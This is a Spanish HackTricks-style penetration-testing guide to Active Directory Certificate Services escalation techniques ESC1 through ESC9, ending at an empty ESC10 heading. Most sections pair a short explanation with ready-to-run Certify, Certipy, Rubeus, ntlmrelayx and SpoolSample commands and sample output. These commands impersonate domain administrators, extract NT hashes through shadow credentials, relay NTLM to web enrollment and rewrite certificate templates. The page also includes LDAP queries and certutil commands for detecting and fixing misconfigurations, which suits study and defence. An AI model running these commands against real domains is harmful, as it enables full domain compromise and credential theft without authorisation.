# Escalada de Dominio de AD CS

<details>

<summary><strong>Aprende hacking de AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

**Este es un resumen de las secciones de técnicas de escalada de los siguientes posts:**

* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Plantillas de Certificados Mal Configuradas - ESC1

### Explicación

### Plantillas de Certificados Mal Configuradas - ESC1 Explicadas

* **Se otorgan derechos de inscripción a usuarios de bajo privilegio por parte de la CA empresarial.**
* **No se requiere aprobación del gerente.**
* **No se necesitan firmas de personal autorizado.**
* **Los descriptores de seguridad en las plantillas de certificados son excesivamente permisivos, lo que permite a usuarios de bajo privilegio obtener derechos de inscripción.**
* **Las plantillas de certificados están configuradas para definir EKUs que facilitan la autenticación:**
* Se incluyen identificadores de Uso Extendido de Clave (EKU) como Autenticación de Cliente (OID 1.3.6.1.5.5.7.3.2), Autenticación de Cliente PKINIT (1.3.6.1.5.2.3.4), Inicio de Sesión con Tarjeta Inteligente (OID 1.3.6.1.4.1.311.20.2.2), Cualquier Propósito (OID 2.5.29.37.0), o sin EKU (SubCA).
* **La capacidad para que los solicitantes incluyan un subjectAltName en la Solicitud de Firma de Certificado (CSR) está permitida por la plantilla:**
* El Directorio Activo (AD) prioriza el subjectAltName (SAN) en un certificado para la verificación de identidad si está presente. Esto significa que al especificar el SAN en un CSR, se puede solicitar un certificado para hacerse pasar por cualquier usuario (por ejemplo, un administrador de dominio). Si un solicitante puede especificar un SAN está indicado en el objeto AD de la plantilla de certificado a través de la propiedad `mspki-certificate-name-flag`. Esta propiedad es una máscara de bits, y la presencia de la bandera `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` permite la especificación del SAN por el solicitante.

{% hint style="danger" %}
La configuración descrita permite a usuarios de bajo privilegio solicitar certificados con cualquier SAN de elección, lo que permite la autenticación como cualquier principal de dominio a través de Kerberos o SChannel.
{% endhint %}

Esta característica a veces se habilita para admitir la generación dinámica de certificados HTTPS o de host por productos o servicios de implementación, o debido a una falta de comprensión.

Se observa que la creación de un certificado con esta opción desencadena una advertencia, lo cual no es el caso cuando se duplica una plantilla de certificado existente (como la plantilla `WebServer`, que tiene `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` habilitado) y luego se modifica para incluir un OID de autenticación.

### Abuso

Para **encontrar plantillas de certificados vulnerables** puedes ejecutar:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Para **abusar de esta vulnerabilidad para hacerse pasar por un administrador** se podría ejecutar:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Luego puedes transformar el **certificado generado a formato `.pfx`** y usarlo para **autenticarte nuevamente usando Rubeus o certipy**:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Los binarios de Windows "Certreq.exe" y "Certutil.exe" se pueden utilizar para generar el PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

La enumeración de plantillas de certificados dentro del esquema de configuración del bosque de AD, específicamente aquellas que no requieren aprobación o firmas, que poseen una EKU de Autenticación de Cliente o Inicio de Sesión de Tarjeta Inteligente, y con la bandera `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` habilitada, se puede realizar ejecutando la siguiente consulta LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Plantillas de Certificados Mal Configuradas - ESC2

### Explicación

El segundo escenario de abuso es una variación del primero:

1. Los derechos de inscripción son otorgados a usuarios de bajo privilegio por la CA de la Empresa.
2. Se deshabilita el requisito de aprobación del gerente.
3. Se omite la necesidad de firmas autorizadas.
4. Un descriptor de seguridad excesivamente permisivo en la plantilla de certificado otorga derechos de inscripción de certificados a usuarios de bajo privilegio.
5. **La plantilla de certificado está definida para incluir el EKU de Cualquier Propósito o ningún EKU.**

El **EKU de Cualquier Propósito** permite que un certificado sea obtenido por un atacante para **cualquier propósito**, incluyendo autenticación de cliente, autenticación de servidor, firma de código, etc. La misma **técnica utilizada para ESC3** puede ser empleada para explotar este escenario.

Los certificados sin **EKUs**, que actúan como certificados de CA secundarios, pueden ser explotados para **cualquier propósito** y también pueden **ser utilizados para firmar nuevos certificados**. Por lo tanto, un atacante podría especificar EKUs arbitrarios o campos en los nuevos certificados utilizando un certificado de CA secundario.

Sin embargo, los nuevos certificados creados para **autenticación de dominio** no funcionarán si la CA secundaria no es confiable por el objeto **`NTAuthCertificates`**, que es la configuración predeterminada. No obstante, un atacante aún puede crear **nuevos certificados con cualquier EKU** y valores de certificado arbitrarios. Estos podrían ser potencialmente **abusados** para una amplia gama de propósitos (por ejemplo, firma de código, autenticación de servidor, etc.) y podrían tener implicaciones significativas para otras aplicaciones en la red como SAML, AD FS o IPSec.

Para enumerar las plantillas que coinciden con este escenario dentro del esquema de configuración del Bosque de AD, se puede ejecutar la siguiente consulta LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Plantillas de Agente de Inscripción Mal Configuradas - ESC3

### Explicación

Este escenario es similar al primero y al segundo pero **abusando** de un **EKU diferente** (Agente de Solicitud de Certificado) y **2 plantillas diferentes** (por lo tanto, tiene 2 conjuntos de requisitos).

El **EKU del Agente de Solicitud de Certificado** (OID 1.3.6.1.4.1.311.20.2.1), conocido como **Agente de Inscripción** en la documentación de Microsoft, permite a un principal **inscribirse** para un **certificado** **en nombre de otro usuario**.

El **"agente de inscripción"** se inscribe en una **plantilla** y utiliza el **certificado resultante para co-firmar un CSR en nombre del otro usuario**. Luego **envía** el **CSR co-firmado** al CA, inscribiéndose en una **plantilla** que **permite "inscribir en nombre de"**, y el CA responde con un **certificado perteneciente al "otro" usuario**.

**Requisitos 1:**

* Los derechos de inscripción son otorgados a usuarios de bajo privilegio por el CA de la Empresa.
* Se omite el requisito de aprobación del gerente.
* No hay requisito de firmas autorizadas.
* El descriptor de seguridad de la plantilla de certificado es excesivamente permisivo, otorgando derechos de inscripción a usuarios de bajo privilegio.
* La plantilla de certificado incluye el EKU del Agente de Solicitud de Certificado, permitiendo la solicitud de otras plantillas de certificado en nombre de otros principales.

**Requisitos 2:**

* El CA de la Empresa otorga derechos de inscripción a usuarios de bajo privilegio.
* Se evita la aprobación del gerente.
* La versión del esquema de la plantilla es 1 o excede 2, y especifica un Requisito de Emisión de Política de Aplicación que requiere el EKU del Agente de Solicitud de Certificado.
* Un EKU definido en la plantilla de certificado permite la autenticación de dominio.
* No se aplican restricciones para los agentes de inscripción en el CA.

### Abuso

Puedes usar [**Certify**](https://github.com/GhostPack/Certify) o [**Certipy**](https://github.com/ly4k/Certipy) para abusar de este escenario:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Los **usuarios** que tienen permitido **obtener** un **certificado de agente de inscripción**, las plantillas en las que los **agentes** de inscripción tienen permiso para inscribirse, y las **cuentas** en nombre de las cuales el agente de inscripción puede actuar pueden ser restringidas por las CAs empresariales. Esto se logra abriendo el `certsrc.msc` **snap-in**, **haciendo clic derecho en la CA**, **haciendo clic en Propiedades**, y luego **navegando** a la pestaña "Agentes de inscripción".

Sin embargo, se observa que la configuración **predeterminada** para las CAs es "No restringir agentes de inscripción". Cuando los administradores habilitan la restricción sobre los agentes de inscripción, estableciéndola en "Restringir agentes de inscripción", la configuración predeterminada sigue siendo extremadamente permisiva. Permite que **Todos** tengan acceso para inscribirse en todas las plantillas como cualquier persona.

## Control de acceso a plantillas de certificados vulnerable - ESC4

### **Explicación**

El **descriptor de seguridad** en las **plantillas de certificados** define los **permisos** específicos que poseen los **principales de AD** con respecto a la plantilla.

Si un **atacante** posee los **permisos** necesarios para **modificar** una **plantilla** e **implementar** cualquier **configuración incorrecta explotable** descrita en **secciones anteriores**, se podría facilitar la escalada de privilegios.

Los permisos destacados aplicables a las plantillas de certificados incluyen:

* **Propietario:** Concede control implícito sobre el objeto, permitiendo la modificación de cualquier atributo.
* **ControlTotal:** Habilita autoridad completa sobre el objeto, incluida la capacidad de modificar cualquier atributo.
* **EscribirPropietario:** Permite la modificación del propietario del objeto a un principal bajo el control del atacante.
* **EscribirDacl:** Permite el ajuste de los controles de acceso, potencialmente otorgando a un atacante ControlTotal.
* **EscribirPropiedad:** Autoriza la edición de cualquier propiedad del objeto.

### Abuso

Un ejemplo de una escalada de privilegios como la anterior:

<figure><img src="../../../.gitbook/assets/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 es cuando un usuario tiene privilegios de escritura sobre una plantilla de certificado. Esto, por ejemplo, puede ser abusado para sobrescribir la configuración de la plantilla de certificado y hacer que la plantilla sea vulnerable a ESC1.

Como podemos ver en la ruta anterior, solo `JOHNPC` tiene estos privilegios, pero nuestro usuario `JOHN` tiene el nuevo enlace `AddKeyCredentialLink` a `JOHNPC`. Dado que esta técnica está relacionada con certificados, también he implementado este ataque, conocido como [Credenciales en sombra](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Aquí hay un pequeño vistazo al comando `shadow auto` de Certipy para recuperar el hash NT de la víctima.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** puede sobrescribir la configuración de una plantilla de certificado con un solo comando. Por **defecto**, Certipy sobrescribirá la configuración para hacerla **vulnerable a ESC1**. También podemos especificar el parámetro **`-save-old` para guardar la configuración antigua**, lo cual será útil para **restaurar** la configuración después de nuestro ataque.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Control de acceso a objetos PKI vulnerables - ESC5

### Explicación

La extensa red de relaciones interconectadas basadas en ACL, que incluye varios objetos más allá de las plantillas de certificados y la autoridad de certificación, puede afectar la seguridad de todo el sistema AD CS. Estos objetos, que pueden afectar significativamente la seguridad, incluyen:

* El objeto de computadora AD del servidor de CA, que puede ser comprometido a través de mecanismos como S4U2Self o S4U2Proxy.
* El servidor RPC/DCOM del servidor de CA.
* Cualquier objeto AD descendiente o contenedor dentro de la ruta de contenedor específica `CN=Servicios de Clave Pública,CN=Servicios,CN=Configuración,DC=<DOMINIO>,DC=<COM>`. Esta ruta incluye, pero no se limita a, contenedores y objetos como el contenedor de Plantillas de Certificados, el contenedor de Autoridades de Certificación, el objeto NTAuthCertificates y el Contenedor de Servicios de Inscripción.

La seguridad del sistema PKI puede verse comprometida si un atacante con privilegios bajos logra obtener control sobre alguno de estos componentes críticos.

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explicación

El tema discutido en el [**post de CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) también aborda las implicaciones de la bandera **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, según lo establecido por Microsoft. Esta configuración, cuando se activa en una Autoridad de Certificación (CA), permite la inclusión de **valores definidos por el usuario** en el **nombre alternativo del sujeto** para **cualquier solicitud**, incluidas aquellas construidas a partir de Active Directory®. En consecuencia, esta disposición permite a un **intruso** inscribirse a través de **cualquier plantilla** configurada para la **autenticación de dominio** —específicamente aquellas abiertas a la inscripción de usuarios **sin privilegios**, como la plantilla de Usuario estándar. Como resultado, se puede asegurar un certificado, lo que permite al intruso autenticarse como un administrador de dominio u **otra entidad activa** dentro del dominio.

**Nota**: El enfoque para agregar **nombres alternativos** en una Solicitud de Firma de Certificado (CSR), a través del argumento `-attrib "SAN:"` en `certreq.exe` (referido como "Pares de Nombre Valor"), presenta un **contraste** con la estrategia de explotación de SANs en ESC1. Aquí, la distinción radica en **cómo se encapsula la información de la cuenta** —dentro de un atributo de certificado, en lugar de una extensión.

### Abuso

Para verificar si la configuración está activada, las organizaciones pueden utilizar el siguiente comando con `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Esta operación emplea esencialmente **acceso remoto al registro**, por lo tanto, un enfoque alternativo podría ser:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Herramientas como [**Certify**](https://github.com/GhostPack/Certify) y [**Certipy**](https://github.com/ly4k/Certipy) son capaces de detectar esta mala configuración y explotarla:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Para modificar estos ajustes, suponiendo que se poseen derechos de **administrador de dominio** o equivalentes, se puede ejecutar el siguiente comando desde cualquier estación de trabajo:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Para deshabilitar esta configuración en su entorno, la bandera puede ser eliminada con:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
Después de las actualizaciones de seguridad de mayo de 2022, los **certificados** recién emitidos contendrán una **extensión de seguridad** que incorpora la **propiedad `objectSid` del solicitante**. Para ESC1, este SID se deriva del SAN especificado. Sin embargo, para **ESC6**, el SID refleja el **`objectSid` del solicitante**, no el SAN.\
Para explotar ESC6, es esencial que el sistema sea susceptible a ESC10 (Mapeos de Certificados Débiles), que prioriza el **SAN sobre la nueva extensión de seguridad**.
{% endhint %}

## Control de Acceso Vulnerable de la Autoridad de Certificación - ESC7

### Ataque 1

#### Explicación

El control de acceso para una autoridad de certificación se mantiene a través de un conjunto de permisos que rigen las acciones de la CA. Estos permisos se pueden ver accediendo a `certsrv.msc`, haciendo clic derecho en una CA, seleccionando propiedades y luego navegando a la pestaña Seguridad. Además, los permisos se pueden enumerar utilizando el módulo PSPKI con comandos como:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Esto proporciona información sobre los derechos principales, a saber **`ManageCA`** y **`ManageCertificates`**, que se correlacionan con los roles de "administrador de CA" y "Administrador de certificados" respectivamente.

#### Abuso

Tener derechos de **`ManageCA`** en una autoridad de certificación permite al principal manipular la configuración de forma remota utilizando PSPKI. Esto incluye cambiar el indicador **`EDITF_ATTRIBUTESUBJECTALTNAME2`** para permitir la especificación de SAN en cualquier plantilla, un aspecto crítico de la escalada de privilegios en el dominio.

La simplificación de este proceso se puede lograr mediante el uso del cmdlet **Enable-PolicyModuleFlag** de PSPKI, lo que permite realizar modificaciones sin interacción directa con la GUI.

La posesión de derechos de **`ManageCertificates`** facilita la aprobación de solicitudes pendientes, evitando efectivamente la salvaguarda de "aprobación del administrador de certificados de CA".

Se puede utilizar una combinación de los módulos **Certify** y **PSPKI** para solicitar, aprobar y descargar un certificado:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Ataque 2

#### Explicación

{% hint style="warning" %}
En el **ataque anterior** se utilizaron los permisos **`Manage CA`** para **habilitar** la bandera **EDITF\_ATTRIBUTESUBJECTALTNAME2** y llevar a cabo el ataque **ESC6**, pero esto no tendrá efecto hasta que se reinicie el servicio de la CA (`CertSvc`). Cuando un usuario tiene el derecho de acceso `Manage CA`, también se le permite **reiniciar el servicio**. Sin embargo, **esto no significa que el usuario pueda reiniciar el servicio de forma remota**. Además, **ESC6** podría no funcionar de inmediato en la mayoría de los entornos parcheados debido a las actualizaciones de seguridad de mayo de 2022.
{% endhint %}

Por lo tanto, se presenta aquí otro ataque.

Requisitos:

* Solo permiso **`ManageCA`**
* Permiso **`Manage Certificates`** (puede otorgarse desde **`ManageCA`**)
* La plantilla de certificado **`SubCA`** debe estar **habilitada** (puede habilitarse desde **`ManageCA`**)

La técnica se basa en que los usuarios con el derecho de acceso `Manage CA` _y_ `Manage Certificates` pueden **emitir solicitudes de certificado fallidas**. La plantilla de certificado **`SubCA`** es **vulnerable a ESC1**, pero **solo los administradores** pueden inscribirse en la plantilla. Por lo tanto, un **usuario** puede **solicitar** inscribirse en el **`SubCA`** - lo cual será **denegado** - pero **luego emitido por el administrador posteriormente**.

#### Abuso

Puedes **otorgarte a ti mismo el acceso `Manage Certificates`** agregando tu usuario como un nuevo oficial.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
La plantilla **`SubCA`** se puede **habilitar en el CA** con el parámetro `-enable-template`. Por defecto, la plantilla `SubCA` está habilitada.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Si hemos cumplido con los requisitos previos para este ataque, podemos comenzar solicitando un certificado basado en la plantilla `SubCA`.

**Esta solicitud será denegada**, pero guardaremos la clave privada y anotaremos el ID de la solicitud.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Con nuestro **`Gestionar CA` y `Gestionar Certificados`**, podemos luego **emitir la solicitud de certificado fallida** con el comando `ca` y el parámetro `-issue-request <ID de solicitud>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Y finalmente, podemos **recuperar el certificado emitido** con el comando `req` y el parámetro `-retrieve <ID de solicitud>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## Relevamiento de NTLM Relay a Puntos Finales HTTP de AD CS – ESC8

### Explicación

{% hint style="info" %}
En entornos donde está instalado **AD CS**, si existe un **punto final de inscripción web vulnerable** y al menos una **plantilla de certificado publicada** que permite **la inscripción de equipos de dominio y la autenticación de clientes** (como la plantilla **`Machine`** por defecto), ¡se vuelve posible que **cualquier equipo con el servicio de spooler activo sea comprometido por un atacante**!
{% endhint %}

Varios **métodos de inscripción basados en HTTP** son compatibles con AD CS, disponibles a través de roles de servidor adicionales que los administradores pueden instalar. Estas interfaces para la inscripción de certificados basada en HTTP son susceptibles a **ataques de relay NTLM**. Un atacante, desde una **máquina comprometida, puede hacerse pasar por cualquier cuenta de AD que se autentique a través de NTLM entrante**. Mientras se hace pasar por la cuenta de la víctima, estos interfaces web pueden ser accedidos por un atacante para **solicitar un certificado de autenticación de cliente utilizando las plantillas de certificado `User` o `Machine`**.

* La **interfaz de inscripción web** (una aplicación ASP más antigua disponible en `http://<caserver>/certsrv/`), por defecto solo es HTTP, lo que no ofrece protección contra ataques de relay NTLM. Además, explícitamente permite solo la autenticación NTLM a través de su encabezado HTTP de Autorización, haciendo que métodos de autenticación más seguros como Kerberos no sean aplicables.
* El **Servicio de Inscripción de Certificados** (CES), el **Servicio Web de Política de Inscripción de Certificados** (CEP) y el **Servicio de Inscripción de Dispositivos de Red** (NDES) admiten por defecto la autenticación de negociación a través de su encabezado HTTP de Autorización. La autenticación de negociación **admite tanto** Kerberos como **NTLM**, permitiendo a un atacante **degradar a NTLM** durante ataques de relay. Aunque estos servicios web habilitan HTTPS por defecto, HTTPS solo **no protege contra ataques de relay NTLM**. La protección contra ataques de relay NTLM para servicios HTTPS solo es posible cuando HTTPS se combina con enlace de canal. Lamentablemente, AD CS no activa la Protección Extendida para la Autenticación en IIS, que es necesaria para el enlace de canal.

Un **problema** común con los ataques de relay NTLM es la **breve duración de las sesiones NTLM** y la incapacidad del atacante para interactuar con servicios que **requieren firma NTLM**.

Sin embargo, esta limitación se supera al explotar un ataque de relay NTLM para adquirir un certificado para el usuario, ya que el período de validez del certificado dicta la duración de la sesión, y el certificado puede ser utilizado con servicios que **exigen firma NTLM**. Para instrucciones sobre cómo utilizar un certificado robado, consulta:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

Otra limitación de los ataques de relay NTLM es que **una máquina controlada por el atacante debe ser autenticada por una cuenta de víctima**. El atacante podría esperar o intentar **forzar** esta autenticación:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **Abuso**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumera **puntos finales HTTP de AD CS habilitados**:
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

La propiedad `msPKI-Enrollment-Servers` es utilizada por las Autoridades de Certificación (CAs) empresariales para almacenar los puntos finales del Servicio de Inscripción de Certificados (CES). Estos puntos finales pueden ser analizados y listados utilizando la herramienta **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../.gitbook/assets/image (757).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../.gitbook/assets/image (940).png" alt=""><figcaption></figcaption></figure>

#### Abuso con Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abuso con [Certipy](https://github.com/ly4k/Certipy)

La solicitud de un certificado se realiza por defecto con Certipy basado en la plantilla `Machine` o `User`, determinada por si el nombre de la cuenta que se está transmitiendo termina en `$`. La especificación de una plantilla alternativa se puede lograr a través del uso del parámetro `-template`.

Una técnica como [PetitPotam](https://github.com/ly4k/PetitPotam) puede luego ser utilizada para forzar la autenticación. Al tratar con controladores de dominio, se requiere la especificación de `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Sin Extensión de Seguridad - ESC9 <a href="#id-5485" id="id-5485"></a>

### Explicación

El nuevo valor **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) para **`msPKI-Enrollment-Flag`**, conocido como ESC9, evita la incrustación de la **nueva extensión de seguridad `szOID_NTDS_CA_SECURITY_EXT`** en un certificado. Este indicador cobra relevancia cuando `StrongCertificateBindingEnforcement` se establece en `1` (la configuración predeterminada), en contraste con una configuración de `2`. Su importancia se incrementa en escenarios donde se pueda explotar un mapeo de certificados más débil para Kerberos o Schannel (como en ESC10), dado que la ausencia de ESC9 no alteraría los requisitos.

Las condiciones bajo las cuales la configuración de este indicador se vuelve significativa incluyen:

- `StrongCertificateBindingEnforcement` no se ajusta a `2` (siendo el valor predeterminado `1`), o `CertificateMappingMethods` incluye el indicador `UPN`.
- El certificado está marcado con el indicador `CT_FLAG_NO_SECURITY_EXTENSION` dentro de la configuración de `msPKI-Enrollment-Flag`.
- Cualquier EKU de autenticación de cliente está especificado por el certificado.
- Los permisos de `GenericWrite` están disponibles sobre cualquier cuenta para comprometer otra.

### Escenario de Abuso

Supongamos que `John@corp.local` tiene permisos de `GenericWrite` sobre `Jane@corp.local`, con el objetivo de comprometer a `Administrator@corp.local`. La plantilla de certificado `ESC9`, en la que `Jane@corp.local` tiene permiso para inscribirse, está configurada con el indicador `CT_FLAG_NO_SECURITY_EXTENSION` en su configuración de `msPKI-Enrollment-Flag`.

Inicialmente, se obtiene el hash de `Jane` utilizando Credenciales de Sombra, gracias al `GenericWrite` de `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Posteriormente, el `userPrincipalName` de `Jane` se modifica a `Administrator`, omitiendo intencionalmente la parte del dominio `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Esta modificación no viola las restricciones, dado que `Administrator@corp.local` sigue siendo distinto como `userPrincipalName` de `Administrator`.

A continuación, se solicita la plantilla de certificado `ESC9`, marcada como vulnerable, como `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Se observa que el `userPrincipalName` del certificado refleja `Administrator`, sin ningún "object SID".

El `userPrincipalName` de `Jane` luego se restablece a su valor original, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Intentar la autenticación con el certificado emitido ahora produce el hash NT de `Administrator@corp.local`. El comando debe incluir `-domain <dominio>` debido a la falta de especificación de dominio del certificado:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Mapeos de Certificados Débiles - ESC10

